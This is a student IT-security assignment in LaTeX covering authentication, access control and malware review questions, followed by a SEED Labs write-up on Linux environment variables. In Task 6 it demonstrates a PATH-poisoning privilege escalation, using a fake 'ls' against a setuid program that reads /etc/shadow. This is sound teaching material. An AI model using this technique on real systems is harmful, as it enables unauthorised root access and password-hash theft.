@@ -1,0 +1,311 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage{listings}
+\usepackage{color}
+
+\definecolor{mygreen}{rgb}{0,0.6,0}
+\definecolor{mygray}{rgb}{0.5,0.5,0.5}
+\definecolor{mymauve}{rgb}{0.58,0,0.82}
+
+\lstset{ 
+  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}; should come as last argument
+  basicstyle=\footnotesize,        % the size of the fonts that are used for the code
+  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
+  breaklines=true,                 % sets automatic line breaking
+  captionpos=b,                    % sets the caption-position to bottom
+  commentstyle=\color{mygreen},    % comment style
+  deletekeywords={...},            % if you want to delete keywords from the given language
+  escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
+  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
+  firstnumber=1000,                % start line enumeration with line 1000
+  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
+  keywordstyle=\color{blue},       % keyword style
+  morekeywords={*,...},            % if you want to add more keywords to the set
+  numbersep=5pt,                   % how far the line-numbers are from the code
+  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
+  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
+  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
+  showstringspaces=false,          % underline spaces within strings only
+  showtabs=false,                  % show tabs within strings adding particular underscores
+  stringstyle=\color{mymauve},     % string literal style
+  tabsize=2,	                   % sets default tabsize to 2 spaces
+  title=\lstname                   % show the filename of files included with \lstinputlisting; also try caption instead of title
+}
+\title{It-sikkerhed: A2}
+\author{Christian Påbøl(wbr220) og Silja Knudsen (dfv380) }
+\date{September 2020}
+
+\begin{document}
+
+\maketitle
+
+\section{Review Questions}
+\subsection{3.1}
+In this question, we wish to answer what are four means of authenticating a user’s identity?\\ 
+
+\begin{itemize}
+    \item Something the individual knows -  by this we mean some confidential information to the individual, which is supposed to be known only by her/him, and thus can be used to prove the identity. This could fx be a password. 
+    
+    \item Something the individual possesses - this is also referred to as a token, and by this type of information, we referrer to an object, the individual have and thus can use to prove his/her identity. 
+    
+    \item Something the individual is - this often referees to some bio metric feature, the individual got. 
+    
+    \item Something the individual does - by this we mean some kind of action, that can characterize the individual and thus can be used to identity him/her. 
+\end{itemize}
+\subsection{3.2}
+In this question, we wish to list and briefly describe the principal threats to the secrecy of passwords. \\ 
+
+%I dette spørgsmål ønsker vi at liste og kort beskrive de vigtigste trusler mod hemmeligholdelsen af ​​adgangskoder.
+%står kun om angreb, så går ud fra det er dem. 
+
+
+\begin{itemize}
+    \item Inadequate access control to the system - if the attacker can get passed the system's access control, he/she can get access to the systems password-file.  
+
+    \item The use of popular a password - the attacker can try to guess the password by trying a lot of different passwords and see if any of them match. Often the attacker will try popular passwords first, since people often choose passwords in similar manners. Thus, choosing a popular password will increase the chance of the attacker guessing the password. 
+    
+    \item The use of personal information in a password - one of the common pattern in choosing a password, is to use personal information. By gaining knowledge about the target, the attacker would have a higher chance of guessing the password. 
+    
+    \item Unattended logged-in workstation - if the attacker able to get inside the workplace and someone has forgotten to log out, the attacker will have access to the system. 
+    
+    \item Not hiding the password - if the user writes the password down or is not careful about not revealing it, it is possible for the attacker to figure out the password. 
+
+    \item Choosing the same password - if the attacker already know the users password in one place, and the user uses the same password in other places, the attacker also have access to those places. 
+    
+\end{itemize}
+
+\subsection{3.4}
+In this exercise, we wish to explain how the proactive password checker approach can improve password security.\\ 
+
+The approach will improve the password security because it avoids the user choosing a bad password, by checking that the password abide some rules. These rules ensure that the chosen password is not easy to guess and is applied in process, when the user is choosing the password. The user will still be able to choose a password from a relative large set of password, which will increase the chance of remembering the password in the feature. Thus, the user will end up with a password that is both hard to guess and memorable. 
+
+\subsection{4.1}
+In this question, we wish to answer what the difference between authentication and authorization is. \\ 
+
+Authentication is the process of verifying the identity of the user and thus, checking if the user are the one, they claims to be. This is often through a login process, where the user provides a username and password. Authorization occurs after the user has been authenticated and based on that determines what the user has access to on the system and to what extend. 
+
+\subsection{4.2}
+In this exercise, we wish to answer how RBAC relates to DAC and MAC\\
+
+RBAC is restricting a system access to only authorized users. In a organization, people will have different tasks and they will have access different objects in the system. RBAC should ensure that the people gets access to the objects they need to perform their tasks, but restrict their access to objects, I do not need. MAC and DAC are two different ways ensure this. In a MAC-model the users are getting assigned to a security-level and will only be able to access objects on that security-level or below. Thus, objects are also being assigned to a security-level. It is the administrator that decides what security-level a person or an object should be assigned to. In a DAC-model, it is persons who creates or owns the objects, that decides who should get access to the object. 
+
+\subsection{6.1}
+In this question, we wish to answer what the three broad mechanisms that malware can use to propagate are.\\ 
+
+\begin{itemize}
+    \item Infected content - this is some malware that attaches copies of itself to some executable content on a system. The attacker often wish to place this malware in some content that gets executed a lot and thereby executes the content in the malware. This kind of malware cannot exist without some content to be attached to.  An example to this kind of malware is virus and is spread by the internet. 
+
+    \item Vulnerability exploit/worms - is this some malware that uses software vulnerabilities to gain acces to a system and then spread. 
+    
+    \item Social engineering - this is tricking users to give access to their systems or information.  
+\end{itemize}
+
+
+\subsection{6.2}
+In this exercise, we wish to answer what the four broad categories of payloads that malware may carry are. \\ 
+
+\begin{itemize}
+    \item System corruption - this payload is the actions, the malware will take on the system. It can for example be to eliminate the systems information either by deleting it or encrypting it.  
+    
+    \item Attack agent-zoombies, bots - this payload is where the malware is placed on the targets computer and what resources it uses. For example an attacker can gain access a computer and use it in a bot-net in a larger attack. The attacker will thus use the network resources on those computers. 
+    
+    \item Information theft - this payload refers to what information, the attacker will steal. The attacker can install a number of different malware, which can collect different information from the user.
+    
+    \item Stealthing - this payload is how the attacker gets access to a target-system and how they hide their presence. 
+\end{itemize}
+
+
+\subsection{6.8}
+In this exercise, we wish to answer what a “drive-by-download” is and how it differs from a worm?\\
+
+A drive-by-download is undesirable downloading of a program (this will often be some kind of malware) to a users computer. This can happen by the user consciously downloading the program, but without knowing the real consequences of the program and what the program really does. It can also happen without the user knowing, the program is being downloaded to the computer. This can for example happen if the user have some vulnerable software installed on the computer, and browse into a website, which is controlled by the attacker. The attacker can make use of this vulnerability download some kind of malware to the computer, without the user knowing it. 
+
+
+%uønsket download af et program. kan være at personen downloader et program, det ikke kender konsekvenserne af, eller at dowloadet sker uden personen ved det. det kan fx ske ved at brugeren at stykke sårbart software installeret på sin computer, og går ind på en hjemmeside, er styret af en angreber. angreberen kan her udnytte, at sårbarheden i applikationen og få brugerens system til at downloade noget bestemt malware. 
+
+
+Drive-by-downloads differ from worms in the since that drive-by-downloads have to be downloaded from some kind of web page in order to get access to the computer, while worms can also spread through contacts for example by mail.
+\section{Problems}
+
+\subsection{1}
+Suppose you have a new smartphone and are excited about the range of apps available for it. You read about a really interesting new game that is available for your phone. You do a quick Web search for it and see that a version is available from one of the free marketplaces. When you download and start to install this app, you are asked to approve the access permissions granted to it. You see that it wants permission to “Send SMS messages” and to “Access your address-book”. Should you be suspicious that a game wants these types of permissions? What threat might the app pose to your smartphone, should you grant these permissions and proceed to install it? What types of malware might it be?\\
+
+You should be suspicious if an app asks permissions outside what it should normally
+require. You could check the official app store, to ensure the original app also asks
+for these permissions. Even then you need to ask yourself what kind of permissions you
+are comfortable giving this app, since even the original app could be data-harvesting you.
+If you install it, and giving the wording of this question, the app would be designed
+to send scam texts to your friends and family(and other contacts)
+\footnote{It should be noted that any app that doesn't allow a user to inspect its
+source is considered malware, and a security risk. see FSF, Stallman et al.}
+
+%vi ved ikke om det installere andre ting end spillet, og vi bør tjekke udbyderen. 
+%det kunne være en worm, der ønsker at sprede sig til andre systemer ved brug af kontrkaterne. 
+%det kunne også medføre til fishing
+
+\subsection{2}
+6.11 Assume you receive an e-mail, which appears to come from a senior manager in your 
+company, with a subject indicating that it concerns a project that you are currently 
+working on. When you view the e-mail, you see that it asks you to review the attached 
+revised press release, supplied as a PDF document, to check that all details are correct 
+before management releases it. When you attempt to open the PDF, the viewer pops up a 
+dialog labeled “Launch File” indicating that “the file and its viewer application are set 
+to be launched by this PDF file.” In the section of this dialog labeled “File,” there are 
+a number of blank lines, and finally the text “Click the ‘Open’ button to view this 
+document.” You also note that there is a vertical scroll-bar visible for this region. What
+type of threat might this pose to your computer system should you indeed select the 
+“Open” button? How could you check your suspicions without threatening your system? What 
+type of attack is this type of message?\\
+
+This kind of attack is a malware dropper, and could infect your computer with
+anything from ransomware to a banking trojan. If you want to check that this indeed is
+a legit document, a good first step would be to check it against a site like "virustotal"
+to check if it is a known bad file. Another logical step would be to write to your
+senior manager and confirm the press release is a legitimate file, and not a worm. If
+one wants to be really cautious, you could open it in a sandboxed environment or a
+virtual machine. This is however uncommon to be found on an enterprise machine
+
+
+\newpage
+\section{SEED Labs}
+This weeks Lab assignment is a bit more task-oriented than week 1. This week deals
+with Linux "environment variables" and how different changes to the running
+process affect them.\\
+
+\subsection{Task 1}
+Is a simple task: manually manipulating environment variables. We used 
+\verb!printenv! and \verb!env! to print variables, along with 
+\verb"echo $VARIABLE". We used the \verb!export! and \verb!unset! to manipulate
+the state of our variables.\\
+Manipulating and using environment variables has a wide usage outside of it
+security, and using them correctly is an important part of having a working
+system. Most noticably you have the locale variables \verb!LANG and LC_*! which
+control how formatting is used across the system, and without which most modern
+applications will fail to run properly. From an X server, we get the \verb!DISPLAY!
+variable which tells the shell which X display to communicate with. Variables
+like \verb!PAGER, BROWSER, EDITOR! is used to set default shell applications for
+other programs to use.\\
+As can be seen, the environment variables are used in many different ways, without
+much in the form of "standardization". They are used to give the shell and
+running programs, hints on how to behave, and act sort of like a simpler windows
+registry.
+\subsection{Task 2}
+We are given a c file to compile \verb!t2.c!, which prints out the environment
+variables in the case of a forked program. Here it is seen that the environment
+variables are the exact same for each process:
+\begin{verbatim}
+seed@VM:~$ ./t2 > t2_child
+...
+seed@VM:~$ ./t2 > t2_parent
+seed@VM:~$ md5sum t2_parent t2_child
+ca1c4cad5877468213c36ec01f36233f  t2_parent
+ca1c4cad5877468213c36ec01f36233f  t2_child
+\end{verbatim}
+\subsection{Task 3}
+For This task we look at how environment variables are transferred using the
+\verb!execve()! call. Specifically the third parameter. First i want to point
+to the \verb!extern char **environ!, a list of strings defined in the POSIX
+Programmer's Manual as "An array of character pointers to the environment 
+strings".\\
+The exec function has the following signature: 
+\verb!execve(const char *path, char *const argv[], char *const envp[]);! and
+the assignment wants us to draw a conclusion regarding how the program gets
+its environment variables. To quote the manual:
+\begin{verbatim}
+The  argument  envp  is  an  array of character pointers to null-terminated strings.
+These strings shall constitute the environment for the new process image.
+The  envp array is terminated by a null pointer.
+\end{verbatim}
+So the final argument to \verb!execve! is a list of the environment variables
+for the next program to be executed.
+
+\subsection{Task 5}
+In task five we compile the program \verb!t5.c! and run it using the following
+shell script:
+\begin{verbatim}
+export PATH=$PATH:/home/seed
+export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/seed
+export SEEDLABS=DEESLABS
+
+gcc -o t5 t5.c
+sudo chown root t5
+sudo chmod 4755 t5
+./t5 > t5_out
+\end{verbatim}
+Interestingly, when looking at the output of this command, we see that the 
+\verb!SEEDLABS and PATH! variables are correctly transferred, but the LD... variable
+isn't carried on. Turning back this time to the Linux Programmers manual on "ld.so",
+the dynamic linker. Two passages stand out:
+\begin{verbatim}
+[...]Using the environment variable LD_LIBRARY_PATH, unless the
+executable is being run in secure-execution mode (see below), in
+which case this variable is ignored.
+\end{verbatim}
+And a description below on secure-execution mode
+\begin{verbatim}
+Secure-execution mode
+   For security reasons, if the dynamic linker determines that a binary
+   should be run in secure-execution mode, the effects of some
+   environment variables are voided or modified, and furthermore those
+   environment variables are stripped from the environment[...]
+   A binary is executed in secure-execution mode [...] for various
+   reasons, including:
+   *  The process's real and effective user IDs differ, or the real and
+      effective group IDs differ.  This typically occurs as a result of
+      executing a set-user-ID or set-group-ID program.
+\end{verbatim}
+
+Which explains why the output of ./t5 doesn't has these variables stripped away.
+
+\subsection{Task 6}
+In our only "exploit" this lab session, we are asked to run a setuid program with
+a flaw. The program in question calls \verb!system("ls")!. The problem occurs since
+"ls" is a relative path, which lets the system determine which "ls" program to run.
+We quickly write up a testing payload as follows:
+\begin{lstlisting}[language=c]
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+
+int main(){
+  // Attempt priviledged read
+  FILE *f = fopen("/etc/shadow", "r");
+  // Check if errno is set
+  if (errno == 13){
+    printf("No root priviledges :'(\n");
+  } else {
+    printf("Running as root >:)\n");
+  }
+  return 0;
+}
+And run the following shell session:
+
+\end{lstlisting}
+\begin{verbatim}
+[09/19/20]seed@VM:~/a2$ gcc -o t6 t6.c; gcc -o ls ls_evil.c
+[09/19/20]seed@VM:~/a2$ sudo chown root t6; sudo chmod 4755 t6
+[09/19/20]seed@VM:~/a2$ ./ls
+No root priviledges
+[09/19/20]seed@VM:~/a2$ which ls
+/bin/ls
+[09/19/20]seed@VM:~/a2$ ./t6
+a.out           ls         t2.c       t2_sums  t3.c  t4_out         t5.c    t6
+env_out         ls_evil.c  t2_child   t3       t4    t4_out_sorted  t5_out  t6.c
+env_out_sorted  sums       t2_parent  t3_2     t4.c  t5             t5.sh
+[09/19/20]seed@VM:~/a2$ export PATH=$PWD:$PATH
+[09/19/20]seed@VM:~/a2$ which ls
+/home/seed/a2/ls
+[09/19/20]seed@VM:~/a2$ ./t6
+Running as root >:)
+[09/19/20]seed@VM:~/a2$
+\end{verbatim}
+It is seen that once we poison the PATH variable to point to our current working
+directory the "ls" executable points to our evil ls instead of the correct ls. This
+is also seen when executing the "which" command. It is also seen that once we
+execute t6 with the poisoned path, we can run priviledged commands, such as reading
+password hashes from "/etc/shadow"
+\subsection{Conclusion}
+Thus concludes our intro to the environment variables. We've seen how they are
+manipulated and how they affect child processes and forks. We've read some dusty
+old manual pages and finally used all that knowledge to perform an attack.
+\end{document}
